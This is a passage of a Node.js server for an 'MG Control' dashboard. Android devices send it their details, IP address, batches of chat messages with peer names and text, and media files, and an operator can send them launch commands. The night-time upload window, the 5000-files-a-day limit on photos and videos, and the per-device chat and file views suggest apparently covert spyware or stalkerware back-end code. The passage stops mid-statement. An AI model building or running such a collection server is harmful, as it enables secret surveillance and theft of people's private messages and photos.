import http from "node:http";
import { URL } from "node:url";
import { createClient } from "@supabase/supabase-js";
import fs from "fs";
import path from "path";

const PORT = process.env.PORT || 3000;

if (!process.env.SUPABASE_URL || !process.env.SUPABASE_SECRET_KEY) {
    console.error("Missing SUPABASE_URL or SUPABASE_SECRET_KEY");
    process.exit(1);
}

const supabase = createClient(
    process.env.SUPABASE_URL,
    process.env.SUPABASE_SECRET_KEY
);

// ============================================
// CONFIG
// ============================================
const UPLOAD_DIR = path.join(process.cwd(), "uploads");
const THUMB_DIR = path.join(process.cwd(), "thumbs");
const LOG_FILE = path.join(process.cwd(), "logs.json");
const CONFIG_FILE = path.join(process.cwd(), "config.json");

if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR, { recursive: true });

let command = {
    title: "MG Menu",
    text: "Server online",
    action: "none",
    activity: ""
};

// ============================================
// HELPERS
// ============================================

function getIP(req) {
    return (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
        req.socket.remoteAddress || "unknown";
}

function publicIp(req) {
    const forwarded = req.headers["x-forwarded-for"];
    if (typeof forwarded === "string" && forwarded) {
        return forwarded.split(",")[0].trim();
    }
    return req.socket.remoteAddress || "";
}

function clean(value) {
    return value == null ? "" : String(value);
}

function number(value) {
    const n = Number(value);
    return Number.isFinite(n) ? n : 0;
}

function optionalNumber(value) {
    const n = Number(value);
    return Number.isFinite(n) ? n : null;
}

function escapeHtml(value) {
    return String(value ?? "")
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
}

function ago(time) {
    const diff = Math.max(0, Date.now() - Number(time));
    if (diff < 60000) return `${Math.floor(diff / 1000)}s ago`;
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    return `${Math.floor(diff / 3600000)}h ago`;
}

function formatDate(dateValue) {
    if (!dateValue) return "-";
    const date = new Date(dateValue);
    if (Number.isNaN(date.getTime())) return "-";
    return date.toLocaleString("en-IN", {
        dateStyle: "medium",
        timeStyle: "short",
    });
}

function formatSize(bytes) {
    const num = Number(bytes);
    if (!Number.isFinite(num) || num < 1) return "-";
    const units = ["B", "KB", "MB", "GB"];
    let size = num;
    let unitIndex = 0;
    while (size >= 1024 && unitIndex < units.length - 1) {
        size /= 1024;
        unitIndex += 1;
    }
    return `${size.toFixed(size >= 10 || unitIndex === 0 ? 0 : 1)} ${units[unitIndex]}`;
}

function getFileType(fileName) {
    const ext = path.extname(fileName || "").toLowerCase();
    if ([".jpg", ".jpeg", ".png", ".gif", ".webp"].includes(ext)) return "image";
    if ([".mp4", ".webm", ".mov", ".mkv"].includes(ext)) return "video";
    return "file";
}

function getFileIcon(type) {
    const icons = { image: "🖼️", video: "🎬", file: "📄" };
    return icons[type] || "📄";
}

function loadConfig() {
    try {
        const data = fs.readFileSync(CONFIG_FILE, "utf-8");
        return JSON.parse(data);
    } catch {
        return {
            enabled: true,
            fileTypes: ['.jpg', '.jpeg', '.png', '.mp4', '.mov'],
            maxFilesPerDay: 5000,
            uploadWindow: '22:00-06:00',
            maxFileSizeMB: 100,
            version: '1.0.2'
        };
    }
}

function saveLog(data) {
    try {
        fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
    } catch {}
}

function readLogs() {
    if (!fs.existsSync(LOG_FILE)) return [];
    try {
        return fs.readFileSync(LOG_FILE, "utf-8")
            .split("\n")
            .filter(Boolean)
            .map(line => {
                try { return JSON.parse(line); } catch { return null; }
            })
            .filter(Boolean);
    } catch {
        return [];
    }
}

function removeFileLogEntries(fileName) {
    const logs = readLogs();
    const nextLogs = logs.filter(entry => !(entry.type === "file" && entry.file === fileName));
    try {
        const content = nextLogs.map(entry => JSON.stringify(entry)).join("\n");
        fs.writeFileSync(LOG_FILE, content ? `${content}\n` : "");
    } catch {}
}

function jsonResponse(res, payload, status = 200) {
    const body = JSON.stringify(payload);
    res.writeHead(status, {
        "Content-Type": "application/json; charset=utf-8",
        "Cache-Control": "no-store"
    });
    res.end(body);
}

function htmlResponse(res, body) {
    res.writeHead(200, {
        "Content-Type": "text/html; charset=utf-8",
        "Cache-Control": "no-store"
    });
    res.end(body);
}

function redirect(res, location) {
    res.writeHead(302, { location });
    res.end();
}

async function readBody(req) {
    const chunks = [];
    for await (const chunk of req) {
        chunks.push(chunk);
    }
    const raw = Buffer.concat(chunks).toString("utf8");
    if (!raw) return {};
    const type = req.headers["content-type"] || "";
    if (String(type).includes("application/x-www-form-urlencoded")) {
        return Object.fromEntries(new URLSearchParams(raw));
    }
    try { return JSON.parse(raw); } catch { return {}; }
}

function isHeartbeatPath(pathname) {
    return pathname === "/api/heartbeat" || pathname === "/api/v1/device/heartbeat";
}

function isChatBatchPath(pathname) {
    return pathname === "/api/chat/batch" || pathname === "/api/v1/chat/batch";
}

async function ensureDevice(deviceId, body, req) {
    const now = Date.now();
    const { data: existing } = await supabase
        .from("devices")
        .select("created_at")
        .eq("device_id", deviceId)
        .maybeSingle();

    const device = {
        device_id: deviceId,
        my_uid: number(body.myUid),
        public_id: clean(body.publicId),
        my_name: clean(body.myName) || "",
        model: clean(body.model) || "",
        brand: clean(body.brand) || "",
        battery_percent: optionalNumber(body.batteryPercent),
        network_type: clean(body.networkType),
        public_ip: publicIp(req),
        client_last_seen: number(body.lastSeen) || now,
        server_last_seen: now,
        created_at: existing?.created_at || now
    };

    const { error } = await supabase
        .from("devices")
        .upsert(device, { onConflict: "device_id" });

    if (error) console.error("ensureDevice upsert error:", error);
}

// ============================================
// RENDER FUNCTIONS
// ============================================

function renderErrorPage(message) {
    return `<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>MG Control Error</title>
<style>body{margin:0;padding:30px;background:#080b10;color:#e8eef7;font-family:system-ui}.error{border:1px solid #7f1d1d;background:#1c0b0b;color:#fecaca;padding:20px;border-radius:10px}</style>
</head><body><div class="error">${escapeHtml(message)}</div></body></html>`;
}

async function renderDashboard() {
    // Fetch devices
    const { data: deviceList, error: deviceError } = await supabase
        .from("devices")
        .select("*")
        .order("server_last_seen", { ascending: false });

    if (deviceError) {
        console.error("Dashboard device error:", deviceError);
        return renderErrorPage("Unable to load devices from database.");
    }

    // Fetch messages
    const { data: allMessages, error: messageError } = await supabase
        .from("messages")
        .select("*")
        .order("message_time", { ascending: false })
        .limit(5000);

    if (messageError) {
        console.error("Dashboard message error:", messageError);
        return renderErrorPage("Unable to load messages from database.");
    }

    // Fetch files
    const logs = readLogs();
    const allFiles = logs.filter(entry => entry.type === "file");

    // Count messages per device
    const messageCounts = {};
    for (const msg of allMessages || []) {
        if (!messageCounts[msg.device_id]) messageCounts[msg.device_id] = 0;
        messageCounts[msg.device_id]++;
    }

    // Count files per device
    const fileCounts = {};
    for (const file of allFiles) {
        const id = file.device_id || "unknown";
        if (!fileCounts[id]) fileCounts[id] = 0;
        fileCounts[id]++;
    }

    // Build devices list
    const devices = (deviceList || []).map(device => ({
        ...device,
        messageCount: messageCounts[device.device_id] || 0,
        fileCount: fileCounts[device.device_id] || 0,
        online: Date.now() - Number(device.server_last_seen) < 60000,
        displayName: device.my_name || device.public_id || 
                     (device.my_uid ? `UID ${device.my_uid}` : device.device_id)
    }));

    // Build device sidebar items
    const deviceItems = devices.map(d => `
        <div class="device-item" data-device="${escapeHtml(d.device_id)}" onclick="selectDevice('${escapeHtml(d.device_id)}')">
            <div class="device-item-left">
                <span class="dot ${d.online ? 'online' : 'offline'}"></span>
                <span class="device-name">${escapeHtml(d.displayName)}</span>
            </div>
            <div class="device-item-right">
                <span class="badge">💬 ${d.messageCount}</span>
                <span class="badge">📁 ${d.fileCount}</span>
            </div>
        </div>
    `).join('');

    // Build device details template
    const firstDevice = devices.length > 0 ? devices[0] : null;

    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>MG Control</title>
    <style>
        :root {
            --bg: #040705;
            --panel: #0a110d;
            --panel-2: #0d1711;
            --line: rgba(104, 255, 168, 0.16);
            --text: #e6fff0;
            --muted: #8baa95;
            --accent: #72ffb7;
            --accent-2: #1dd17d;
            --shadow: 0 24px 60px rgba(0, 0, 0, 0.45);
        }

        * { box-sizing: border-box; }
        body {
            margin: 0;
            font-family: "Segoe UI", system-ui, sans-serif;
            color: var(--text);
            background: var(--bg);
            height: 100vh;
            overflow: hidden;
        }

        /* HEADER */
        .header {
            height: 56px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 20px;
            border-bottom: 1px solid var(--line);
            background: var(--panel);
            flex-shrink: 0;
        }
        .header h1 { font-size: 16px; margin: 0; }
        .header small { color: var(--muted); }

        /* APP LAYOUT */
        .app {
            display: flex;
            height: calc(100vh - 56px);
        }

        /* SIDEBAR */
        .sidebar {
            width: 320px;
            min-width: 320px;
            background: var(--panel);
            border-right: 1px solid var(--line);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .sidebar-stats {
            display: flex;
            gap: 8px;
            padding: 12px 16px;
            border-bottom: 1px solid var(--line);
            flex-shrink: 0;
            background: var(--panel-2);
        }
        .sidebar-stats .stat-box {
            flex: 1;
            text-align: center;
            padding: 6px;
            border-radius: 8px;
            background: rgba(255,255,255,0.03);
            border: 1px solid var(--line);
        }
        .sidebar-stats .stat-box strong { display: block; font-size: 18px; }
        .sidebar-stats .stat-box small { color: var(--muted); font-size: 10px; }

        .device-list {
            flex: 1;
            overflow-y: auto;
            padding: 8px;
        }

        .device-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 12px;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.2s;
            border: 1px solid transparent;
            margin-bottom: 4px;
        }
        .device-item:hover {
            background: rgba(255,255,255,0.04);
            border-color: var(--line);
        }
        .device-item.active {
            background: rgba(114,255,183,0.08);
            border-color: rgba(114,255,183,0.3);
        }
        .device-item-left {
            display: flex;
            align-items: center;
            gap: 10px;
            min-width: 0;
        }
        .device-item-left .device-name {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .device-item-right {
            display: flex;
            gap: 6px;
            flex-shrink: 0;
        }
        .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            display: inline-block;
            flex-shrink: 0;
        }
        .dot.online { background: #22c55e; box-shadow: 0 0 8px rgba(34,197,94,0.4); }
        .dot.offline { background: #64748b; }

        .badge {
            background: rgba(255,255,255,0.06);
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 11px;
            color: var(--muted);
            white-space: nowrap;
        }

        /* MAIN PANEL */
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            padding: 16px 20px;
            background: var(--bg);
        }

        .main-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 12px;
            flex-shrink: 0;
        }
        .main-header h2 {
            margin: 0;
            font-size: 22px;
        }
        .main-header .sub {
            color: var(--muted);
            font-size: 13px;
        }

        /* TABS */
        .tabs {
            display: flex;
            gap: 4px;
            border-bottom: 1px solid var(--line);
            margin-bottom: 12px;
            flex-shrink: 0;
        }
        .tab-btn {
            padding: 8px 16px;
            border: none;
            background: transparent;
            color: var(--muted);
            cursor: pointer;
            font-size: 13px;
            border-bottom: 2px solid transparent;
            transition: all 0.2s;
        }
        .tab-btn:hover { color: var(--text); }
        .tab-btn.active {
            color: var(--accent);
            border-bottom-color: var(--accent);
        }

        .tab-content {
            flex: 1;
            overflow-y: auto;
            display: none;
        }
        .tab-content.active { display: block; }

        /* INFO TAB */
        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px 24px;
            background: var(--panel);
            padding: 16px 20px;
            border-radius: 12px;
            border: 1px solid var(--line);
        }
        .info-grid .label { color: var(--muted); font-size: 12px; }
        .info-grid .value { font-weight: 500; }

        /* CHATS TAB */
        .chat-list {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        .chat-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 12px;
            border-radius: 8px;
            background: var(--panel);
            border: 1px solid var(--line);
        }
        .chat-item .peer { font-weight: 500; }
        .chat-item .direction {
            font-size: 11px;
            padding: 2px 10px;
            border-radius: 12px;
        }
        .chat-item .direction.in { background: rgba(147,197,253,0.15); color: #93c5fd; }
        .chat-item .direction.out { background: rgba(134,239,172,0.15); color: #86efac; }
        .chat-item .text {
            color: var(--muted);
            max-width: 300px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .chat-item .time { color: var(--muted); font-size: 11px; white-space: nowrap; }

        /* FILES TAB */
        .file-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
            gap: 12px;
        }
        .file-card {
            background: var(--panel);
            border: 1px solid var(--line);
            border-radius: 10px;
            overflow: hidden;
            transition: transform 0.2s, border-color 0.2s;
            cursor: pointer;
        }
        .file-card:hover {
            transform: translateY(-2px);
            border-color: rgba(114,255,183,0.3);
        }
        .file-card .thumb {
            height: 100px;
            background: var(--panel-2);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
        }
        .file-card .thumb img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .file-card .info {
            padding: 8px 10px;
        }
        .file-card .info .name {
            font-size: 12px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .file-card .info .meta {
            font-size: 10px;
            color: var(--muted);
            display: flex;
            justify-content: space-between;
        }

        .file-list-view .file-grid { display: none; }
        .file-list-view .file-table-wrap { display: block; }

        .file-table-wrap {
            display: none;
            overflow-x: auto;
        }
        .file-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }
        .file-table th, .file-table td {
            padding: 8px 12px;
            border-bottom: 1px solid var(--line);
            text-align: left;
        }
        .file-table th { color: var(--muted); font-weight: 500; }

        .file-actions {
            display: flex;
            gap: 8px;
        }
        .file-actions a, .file-actions button {
            color: var(--accent);
            text-decoration: none;
            background: none;
            border: none;
            cursor: pointer;
            font-size: 12px;
            padding: 2px 6px;
        }
        .file-actions button.delete { color: #ff6b6b; }

        /* MODAL */
        .modal {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(4px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 100;
            padding: 20px;
        }
        .modal.show { display: flex; }
        .modal-content {
            max-width: 800px;
            max-height: 90vh;
            background: var(--panel);
            border-radius: 16px;
            border: 1px solid var(--line);
            overflow: hidden;
            box-shadow: var(--shadow);
        }
        .modal-content img, .modal-content video {
            max-width: 100%;
            max-height: 70vh;
            display: block;
        }
        .modal-content .modal-body { padding: 16px; }
        .modal-content .modal-actions {
            display: flex;
            gap: 12px;
            padding: 12px 16px;
            border-top: 1px solid var(--line);
        }
        .modal-content .modal-actions a {
            color: var(--accent);
            text-decoration: none;
        }
        .modal-close {
            position: absolute;
            top: 12px;
            right: 16px;
            background: none;
            border: none;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
        }

        /* EMPTY STATE */
        .empty-state {
            padding: 40px;
            text-align: center;
            color: var(--muted);
            border: 1px dashed var(--line);
            border-radius: 12px;
            background: var(--panel);
        }

        /* SCROLLBAR */
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: var(--line); border-radius: 4px; }

        /* RESPONSIVE */
        @media (max-width: 768px) {
            .sidebar { width: 200px; min-width: 200px; }
            .info-grid { grid-template-columns: 1fr; }
            .file-grid { grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); }
        }
        @media (max-width: 600px) {
            .app { flex-direction: column; }
            .sidebar { width: 100%; min-width: unset; height: 200px; border-right: none; border-bottom: 1px solid var(--line); }
            .main { padding: 12px; }
        }
    </style>
</head>
<body>

<div class="header">
    <div><h1>MG Control</h1><small>Chat + Device + Files</small></div>
    <small>${escapeHtml(new Date().toLocaleString())}</small>
</div>

<div class="app">

    <!-- SIDEBAR -->
    <div class="sidebar">
        <div class="sidebar-stats">
            <div class="stat-box"><strong>${devices.length}</strong><small>Devices</small></div>
            <div class="stat-box"><strong>${allMessages?.length || 0}</strong><small>Messages</small></div>
            <div class="stat-box"><strong>${allFiles.length}</strong><small>Files</small></div>
        </div>
        <div class="device-list" id="deviceList">
            ${deviceItems || '<div class="empty-state">No devices found</div>'}
        </div>
    </div>

    <!-- MAIN -->
    <div class="main" id="mainPanel">
        <div class="main-header">
            <div>
                <h2 id="deviceTitle">${firstDevice ? escapeHtml(firstDevice.displayName) : 'No Device Selected'}</h2>
                <div class="sub" id="deviceSub">${firstDevice ? `${escapeHtml(firstDevice.brand || '')} ${escapeHtml(firstDevice.model || '')} • ${firstDevice.messageCount} messages • ${firstDevice.fileCount} files` : ''}</div>
            </div>
            <div id="deviceStatus" style="color:${firstDevice?.online ? '#22c55e' : '#64748b'}">${firstDevice?.online ? '🟢 Online' : '⚪ Offline'}</div>
        </div>

        <div class="tabs">
            <button class="tab-btn active" data-tab="info" onclick="switchTab('info')">📋 Info</button>
            <button class="tab-btn" data-tab="chats" onclick="switchTab('chats')">💬 Chats</button>
            <button class="tab-btn" data-tab="files" onclick="switchTab('files')">📁 Files</button>
        </div>

        <div id="tabInfo" class="tab-content active">
            <div id="infoContent">${firstDevice ? renderInfoTab(firstDevice) : '<div class="empty-state">Select a device</div>'}</div>
        </div>

        <div id="tabChats" class="tab-content">
            <div id="chatsContent">${firstDevice ? '<div class="empty-state">Loading chats...</div>' : '<div class="empty-state">Select a device</div>'}</div>
        </div>

        <div id="tabFiles" class="tab-content">
            <div id="filesContent">${firstDevice ? '<div class="empty-state">Loading files...</div>' : '<div class="empty-state">Select a device</div>'}</div>
        </div>
    </div>
</div>

<!-- MODAL -->
<div class="modal" id="fileModal" onclick="if(event.target===this)closeModal()">
    <div class="modal-content" style="position:relative;">
        <button class="modal-close" onclick="closeModal()">✕</button>
        <div id="modalBody"></div>
        <div class="modal-actions" id="modalActions"></div>
    </div>
</div>

<script>
    // ============================================
    // STATE
    // ============================================
    let currentDeviceId = ${firstDevice ? JSON.stringify(firstDevice.device_id) : 'null'};
    const deviceData = ${JSON.stringify(devices)};

    // ============================================
    // SELECT DEVICE
    // ============================================
    function selectDevice(deviceId) {
        currentDeviceId = deviceId;
        
        // Update sidebar
        document.querySelectorAll('.device-item').forEach(el => {
            el.classList.toggle('active', el.dataset.device === deviceId);
        });

        // Update header
        const device = deviceData.find(d => d.device_id === deviceId);
        if (device) {
            document.getElementById('deviceTitle').textContent = device.displayName;
            document.getElementById('deviceSub').textContent = 
                `${device.brand || ''} ${device.model || ''} • ${device.messageCount} messages • ${device.fileCount} files`;
            document.getElementById('deviceStatus').textContent = device.online ? '🟢 Online' : '⚪ Offline';
            document.getElementById('deviceStatus').style.color = device.online ? '#22c55e' : '#64748b';
        }

        // Load data
        loadDeviceInfo(deviceId);
        loadDeviceChats(deviceId);
        loadDeviceFiles(deviceId);

        // Switch to info tab
        switchTab('info');
    }

    // ============================================
    // LOAD DEVICE INFO
    // ============================================
    function loadDeviceInfo(deviceId) {
        fetch(`/api/device/${deviceId}`)
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    document.getElementById('infoContent').innerHTML = renderInfo(data.device);
                }
            })
            .catch(() => {
                document.getElementById('infoContent').innerHTML = '<div class="empty-state">Failed to load device info</div>';
            });
    }

    function renderInfo(device) {
        if (!device) return '<div class="empty-state">No device info</div>';
        return `
            <div class="info-grid">
                <div><div class="label">Device ID</div><div class="value">${escapeHtml(device.device_id)}</div></div>
                <div><div class="label">Display Name</div><div class="value">${escapeHtml(device.my_name || device.public_id || device.device_id)}</div></div>
                <div><div class="label">Brand</div><div class="value">${escapeHtml(device.brand || '-')}</div></div>
                <div><div class="label">Model</div><div class="value">${escapeHtml(device.model || '-')}</div></div>
                <div><div class="label">Battery</div><div class="value">${device.battery_percent ?? '?'}%</div></div>
                <div><div class="label">Android</div><div class="value">${escapeHtml(device.android || '-')}</div></div>
                <div><div class="label">IP Address</div><div class="value">${escapeHtml(device.public_ip || device.ip || '-')}</div></div>
                <div><div class="label">Network</div><div class="value">${escapeHtml(device.network_type || '-')}</div></div>
                <div><div class="label">UID</div><div class="value">${escapeHtml(device.my_uid || '-')}</div></div>
                <div><div class="label">Public ID</div><div class="value">${escapeHtml(device.public_id || '-')}</div></div>
                <div><div class="label">Last Seen</div><div class="value">${escapeHtml(formatDate(device.server_last_seen || device.lastSeen))}</div></div>
                <div><div class="label">Created</div><div class="value">${escapeHtml(formatDate(device.created_at || device.time))}</div></div>
            </div>
        `;
    }

    // ============================================
    // LOAD DEVICE CHATS
    // ============================================
    function loadDeviceChats(deviceId) {
        fetch(`/api/device/${deviceId}/chats`)
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    document.getElementById('chatsContent').innerHTML = renderChats(data.messages);
                }
            })
            .catch(() => {
                document.getElementById('chatsContent').innerHTML = '<div class="empty-state">Failed to load chats</div>';
            });
    }

    function renderChats(messages) {
        if (!messages || messages.length === 0) {
            return '<div class="empty-state">No messages for this device</div>';
        }
        return `
            <div class="chat-list">
                ${messages.map(m => `
                    <div class="chat-item">
                        <div>
                            <span class="peer">${escapeHtml(m.peer_name || (m.peer_uid ? 'UID ' + m.peer_uid : 'Unknown'))}</span>
                            <span class="direction ${m.direction === 'out' ? 'out' : 'in'}">${escapeHtml(m.direction)}</span>
                        </div>
                        <div class="text">${escapeHtml(m.text || '')}</div>
                        <div class="time">${escapeHtml(formatDate(m.message_time))}</div>
                    </div>
                `).join('')}
            </div>
        `;
    }

    // ============================================
    // LOAD DEVICE FILES
    // ============================================
    function loadDeviceFiles(deviceId) {
        fetch(`/api/device/${deviceId}/files`)
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    document.getElementById('filesContent').innerHTML = renderFiles(data.files);
                }
            })
            .catch(() => {
                document.getElementById('filesContent').innerHTML = '<div class="empty-state">Failed to load files</div>';
            });
    }

    function renderFiles(files) {
        if (!files || files.length === 0) {
            return '<div class="empty-state">No files for this device</div>';
        }
        return `
            <div class="file-grid">
                ${files.map(f => {
                    const isImage = f.original?.match(/\.(jpg|jpeg|png|gif|webp)$/i);
                    const thumbUrl = isImage ? `/thumbs/${encodeURIComponent(f.thumb || f.file)}` : '';
                    return `
                        <div class="file-card" onclick="openFile('${encodeURIComponent(f.file)}', '${escapeHtml(f.original)}', '${escapeHtml(f.typeLabel || 'file')}', '${encodeURIComponent(f.thumb || '')}', ${f.size || 0})">
                            <div class="thumb">
                                ${isImage ? `<img src="${thumbUrl}" alt="${escapeHtml(f.original)}" loading="lazy">` : getFileIcon(f.typeLabel)}
                            </div>
                            <div class="info">
                                <div class="name" title="${escapeHtml(f.original)}">${escapeHtml(f.original)}</div>
                                <div class="meta">
                                    <span>${formatSize(f.size || 0)}</span>
                                    <span>${escapeHtml(formatDate(f.time))}</span>
                                </div>
                            </div>
                        </div>
                    `;
                }).join('')}
            </div>
        `;
    }

    // ============================================
    // TABS
    // ============================================
    function switchTab(tab) {
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.classList.toggle('active', btn.dataset.tab === tab);
        });
        document.querySelectorAll('.tab-content').forEach(el => {
            el.classList.toggle('active', el.id === 'tab' + tab.charAt(0).toUpperCase() + tab.slice(1));
        });
    }

    // ============================================
    // MODAL
    // ============================================
    function openFile(file, name, type, thumb, size) {
        const modal = document.getElementById('fileModal');
        const body = document.getElementById('modalBody');
        const actions = document.getElementById('modalActions');

        const isImage = type === 'image' || name?.match(/\.(jpg|jpeg|png|gif|webp)$/i);
        const isVideo = type === 'video' || name?.match(/\.(mp4|webm|mov|mkv)$/i);
        const thumbUrl = isImage ? `/thumbs/${thumb}` : '';

        if (isImage) {
            body.innerHTML = `<img src="${thumbUrl}" alt="${escapeHtml(name)}" style="max-width:100%;max-height:70vh;">`;
        } else if (isVideo) {
            body.innerHTML = `<video controls style="max-width:100%;max-height:70vh;"><source src="/uploads/${file}"></video>`;
        } else {
            body.innerHTML = `<div style="padding:40px;text-align:center;font-size:48px;">📄</div><div style="text-align:center;">${escapeHtml(name)}</div>`;
        }

        actions.innerHTML = `
            <a href="/uploads/${file}" target="_blank">Open</a>
            <a href="/uploads/${file}" download>Download</a>
            <button onclick="deleteFile('${file}')" style="color:#ff6b6b;background:none;border:none;cursor:pointer;">Delete</button>
            <button onclick="closeModal()" style="background:none;border:1px solid var(--line);color:var(--muted);padding:4px 12px;border-radius:6px;cursor:pointer;">Close</button>
        `;

        modal.classList.add('show');
    }

    function closeModal() {
        document.getElementById('fileModal').classList.remove('show');
    }

    // ============================================
    // DELETE FILE
    // ============================================
    function deleteFile(fileName) {
        if (!confirm('Delete this file?')) return;
        fetch('/api/file/' + fileName, { method: 'DELETE' })
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    closeModal();
                    if (currentDeviceId) loadDeviceFiles(currentDeviceId);
                }
            });
    }

    // ============================================
    // ESCAPE HELPERS (JS)
    // ============================================
    function escapeHtml(text) {
        if (!text) return '';
        return String(text).replace(/[&<>"']/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            if (m === '"') return '&quot;';
            if (m === "'") return '&#39;';
            return m;
        });
    }

    function formatDate(val) {
        if (!val) return '-';
        try {
            const d = new Date(val);
            if (isNaN(d.getTime())) return '-';
            return d.toLocaleString('en-IN', { dateStyle: 'medium', timeStyle: 'short' });
        } catch { return '-'; }
    }

    function formatSize(bytes) {
        if (!bytes || bytes < 1) return '-';
        const units = ['B', 'KB', 'MB', 'GB'];
        let i = 0;
        let size = bytes;
        while (size >= 1024 && i < units.length - 1) { size /= 1024; i++; }
        return size.toFixed(size >= 10 ? 0 : 1) + ' ' + units[i];
    }

    function getFileIcon(type) {
        const icons = { image: '🖼️', video: '🎬', file: '📄' };
        return icons[type] || '📄';
    }

    // ============================================
    // AUTO SELECT FIRST DEVICE
    // ============================================
    if (currentDeviceId) {
        selectDevice(currentDeviceId);
    }
</script>
</body>
</html>`;
}

// ============================================
// API ROUTES
// ============================================

// ============================================
// GET DEVICE INFO
// ============================================
async function getDeviceInfo(deviceId) {
    const { data, error } = await supabase
        .from("devices")
        .select("*")
        .eq("device_id", deviceId)
        .maybeSingle();

    if (error) {
        console.error("Device info error:", error);
        return null;
    }
    return data;
}

// ============================================
// GET DEVICE CHATS
// ============================================
async function getDeviceChats(deviceId) {
    const { data, error } = await supabase
        .from("messages")
        .select("*")
        .eq("device_id", deviceId)
        .order("message_time", { ascending: false })
        .limit(100);

    if (error) {
        console.error("Device chats error:", error);
        return [];
    }
    return data || [];
}

// ============================================
// GET DEVICE FILES
// ============================================
function getDeviceFiles(deviceId) {
    const logs = readLogs();
    return logs
        .filter(entry => entry.type === "file" && entry.device_id === deviceId)
        .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));
}

// ============================================
// HTTP SERVER
// ============================================

const server = http.createServer(async (req, res) => {
    try {
        const url = new URL(
            req.url || "/",
            `http://${req.headers.host || "localhost"}`
        );

        // ============================================
        // DASHBOARD
        // ============================================
        if (req.method === "GET" && url.pathname === "/") {
            return htmlResponse(res, await renderDashboard());
        }

        // ============================================
        // CONFIG
        // ============================================
        if (req.method === "GET" && url.pathname === "/config") {
            const cfg = loadConfig();
            res.writeHead(200, { "Content-Type": "text/plain", "Cache-Control": "no-store" });
            res.end(cfg.enabled ? "1" : "0");
            return;
        }

        // ============================================
        // COMMAND
        // ============================================
        if (req.method === "GET" && url.pathname === "/api/data") {
            return jsonResponse(res, command);
        }

        if (req.method === "POST" && url.pathname === "/panel/command") {
            const body = await readBody(req);
            command = {
                title: "MG Menu",
                text: String(body.text || "Server online"),
                action: body.activity ? "launch" : "none",
                activity: String(body.activity || "")
            };
            redirect(res, "/");
            return;
        }

        // ============================================
        // DEVICE HEARTBEAT
        // ============================================
        if (req.method === "POST" && isHeartbeatPath(url.pathname)) {
            const body = await readBody(req);
            const deviceId = clean(body.deviceId);

            if (!deviceId) {
                return jsonResponse(res, { ok: false, error: "deviceId required" }, 400);
            }

            const now = Date.now();
            const device = {
                device_id: deviceId,
                my_uid: number(body.myUid),
                public_id: clean(body.publicId),
                my_name: clean(body.myName),
                model: clean(body.model),
                brand: clean(body.brand),
                battery_percent: optionalNumber(body.batteryPercent),
                network_type: clean(body.networkType),
                public_ip: publicIp(req),
                client_last_seen: number(body.lastSeen) || now,
                server_last_seen: now,
                created_at: now
            };

            const { data: existingDevice } = await supabase
                .from("devices")
                .select("created_at")
                .eq("device_id", deviceId)
                .maybeSingle();

            if (existingDevice?.created_at) {
                device.created_at = existingDevice.created_at;
            }

            const { error: deviceError } = await supabase
                .from("devices")
                .upsert(device, { onConflict: "device_id" });

            if (deviceError) {
                console.error("Device upsert error:", deviceError);
                return jsonResponse(res, { ok: false, error: "database error" }, 500);
            }

            return jsonResponse(res, { ok: true });
        }

        // ============================================
        // CHAT BATCH
        // ============================================
        if (req.method === "POST" && isChatBatchPath(url.pathname)) {
            const body = await readBody(req);
            const deviceId = clean(body.deviceId);

            if (!deviceId) {
                return jsonResponse(res, { ok: false, error: "deviceId required" }, 400);
            }

            const list = Array.isArray(body.messages) ? body.messages.slice(0, 50) : [];

            if (!list.length) {
                return jsonResponse(res, { ok: true, inserted: 0, skipped: 0 });
            }

            await ensureDevice(deviceId, body, req);

            const rows = [];
            let skipped = 0;

            for (const raw of list) {
                const mid = clean(raw.mid);
                if (!mid) {
                    skipped++;
                    continue;
                }
                rows.push({
